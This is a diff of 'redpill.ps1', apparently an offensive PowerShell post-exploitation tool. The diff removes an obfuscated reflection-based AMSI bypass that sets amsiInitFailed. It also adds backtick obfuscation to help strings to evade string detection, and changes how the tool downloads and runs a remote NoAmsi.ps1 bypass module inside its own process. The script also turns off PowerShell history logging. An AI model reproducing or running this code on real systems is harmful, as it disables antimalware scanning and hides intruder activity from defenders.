@@ -145,24 +145,6 @@ Write-Host "$Banner" -ForegroundColor Blue
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 
-
-try {
-
-   <#
-   .SYNOPSIS
-      Author: @r00t-3xp10it
-      Helper - 'AmsiStringDetectionBypass'
-   #>
-
-   $MsTeamsId = "4456625220575263174452554847"
-   $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
-   $Drawing = "Sy@ste£.M@ana"+"ge£e@nt" + ".Auto@£ati@on."+"A£s@i"+"U@ti@ls" -Join ''
-   $Graphics = [string](0..13|%{[char][int](53+($MsTeamsId).substring(($_*2),2))}) -Replace ' '
-   $imgForm = $Drawing.Replace("@","").Replace("£","m");$Bitmap = [Ref].Assembly.GetType($imgForm)
-   $i0Stream = $Bitmap.GetField($Graphics,"$ComponentDeviceId,Static");$i0Stream.SetValue($null,$true)
-}catch{}
-
-
 If($Help -ieq "Parameters"){
 
    <#
@@ -3191,7 +3173,7 @@ If($NoAmsi -ne "false"){
    source code POC's obfuscated {by me} to evade string\runtime detection.
    
 .NOTES
-   _Remark: The Amsi_bypasses will only work on current shell while is
+   _Remark: The Am`si_bypasses will only work on current shell while is
    process is running. But on process close all will return to default.
    _Remark: If sellected -Action '<testall>' then this cmdlet will try
    all available bypasses and aborts at the first successfull bypass.
@@ -3200,57 +3182,57 @@ If($NoAmsi -ne "false"){
    Accepts arguments: list, testall, bypass (default: bypass)
 
 .Parameter Id
-  The technic Id to use for amsi_bypass (default: 2)  
+  The technic Id to use for am`si_bypass (default: 2)  
 
 .EXAMPLE
    PS C:\> .\redpill.ps1 -NoAmsi List
-   List ALL cmdlet Amsi_bypasses available!
+   List ALL cmdlet Am`si_bypasses available!
 
 .EXAMPLE
    PS C:\> .\redpill.ps1 -NoAmsi TestAll
-   Test ALL cmdlet Amsi_bypasses technics!
+   Test ALL cmdlet Am`si_bypasses technics!
 
 .EXAMPLE
    PS C:\> .\redpill.ps1 -NoAmsi Bypass -Id 2
-   Execute Amsi_bypass technic nº2 on current shell!
+   Execute Am`si_bypass technic nº2 on current shell!
 
 .OUTPUTS
-   Testing amsi_bypass technics
+   Testing am`si_bypass technics
    ----------------------------
    Id          : 1
-   bypass      : available
+   bypass      : Success
    Disclosure  : @nullbyte
-   Description : PS_DOWNGRADE_ATTACK
-   POC         : powershell -version 2 -C Get-Host
-   Remark      : Manual Execute 'powershell -version 2'
+   Description : PS_DOWNG`RADE_ATT`ACK
+   POC         : Execute: Get-Host
+   Remark      : Execute 'exit' to return to PSv5 console!
 
    Id          : 2
    bypass      : success
    Disclosure  : @mattifestation
-   Description : DLL_REFLECTION
+   Description : DL`L_REFLE`CTION
    POC         : ----
-   Remark      : string detection successfully disabled
+   Remark      : string detection bypassed!
 
    Id          : 3
    bypass      : success
    Disclosure  : @mattifestation
-   Description : FORCE_AMSI_ERROR
+   Description : FORCE_AM`SI_ERROR
    POC         : ----
-   Remark      : string detection successfully disabled 
+   Remark      : string detection bypassed! 
    
    Id          : 4
    bypass      : success
    Disclosure  : @_RastaMouse
-   Description : AMSI_RESULT_CLEAN
+   Description : AM`SI_RESULT_CLEAN
    POC         : ----
-   Remark      : string detection successfully disabled
+   Remark      : string detection bypassed!
 
    Id          : 5
    bypass      : success
    Disclosure  : @am0nsec
-   Description : AMSI_SCANBUFFER_PATCH
+   Description : AM`SI_SCANBUFF`ER_PATCH
    POC         : ----
-   Remark      : string detection successfully disabled 
+   Remark      : string detection bypassed! 
 #>
 
    ## Download NoAmsi.ps1 from my GitHub
@@ -3258,14 +3240,14 @@ If($NoAmsi -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/NoAmsi.ps1 -Destination $Env:TMP\NoAmsi.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\NoAmsi.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 32){## Corrupted download detected => DefaultFileSize: 32,345703125/KB
+      If($SizeDump -lt 34){## Corrupted download detected => DefaultFileSize: 34,9296875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\NoAmsi.ps1"){Remove-Item -Path "$Env:TMP\NoAmsi.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
       }   
    }
 
-   ## replace global variable
+   ## replace global variable on NoAmsi.ps1
    ((Get-Content -Path "$Env:TMP\NoAmsi.ps1" -Raw) -Replace "viriato='0'","viriato='1'")|Set-Content -Path "$Env:TMP\NoAmsi.ps1" -Force
 
    ## Run auxiliary module
@@ -3276,12 +3258,13 @@ If($NoAmsi -ne "false"){
    ElseIf($NoAmsi -ieq "TestAll" -or $NoAmsi -ieq "Bypass")
    {
       If($Id -eq "false"){$Id = "2"}
-      powershell -File "$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -Id $Id
+      ## &"<script>" allows me to run NoAmsi on redpill process
+      &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -Id $Id
    }
    Else
    {
       Write-Host "[error] Bad parameter input ($NoAmsi)" -ForegroundColor Red -BackgroundColor Black
-      Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @redpill
    }
 
    ## Clean Artifacts left behind
@@ -5199,36 +5182,36 @@ $HelpParameters = @"
       Accepts arguments: list, testall, bypass (default: bypass)
 
    .Parameter Id
-      The technic Id to use for amsi_bypass (default: 2)  
+      The technic Id to use for am`si_bypass (default: 2)  
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -NoAmsi List
-      List ALL cmdlet Amsi_bypasses available!
+      List ALL cmdlet Am`si_bypasses available!
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -NoAmsi TestAll
-      Test ALL cmdlet Amsi_bypasses technics!
+      Test ALL cmdlet Am`si_bypasses technics!
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -NoAmsi Bypass -Id 2
-      Execute Amsi_bypass technic nº2 on current shell!
+      Execute Am`si_bypass technic nº2 on current shell!
 
    .OUTPUTS
-      Testing amsi_bypass technics
+      Testing am`si_bypass technics
       ----------------------------
       Id          : 1
-      bypass      : available
+      bypass      : failed
       Disclosure  : @nullbyte
-      Description : PS_DOWNGRADE_ATTACK
+      Description : PS_DOWNG`RADE_ATT`ACK
       POC         : powershell -version 2 -C Get-Host
-      Remark      : Manual Execute 'powershell -version 2'
+      Remark      : powershell version 2 not found in SKYNET!
 
       Id          : 2
       bypass      : success
       Disclosure  : @mattifestation
-      Description : DLL_REFLECTION
+      Description : DL`L_REFLEC`TION
       POC         : ----
-      Remark      : string detection successfully disabled
+      Remark      : string detection bypassed!
    #>!bye..
 
 "@;
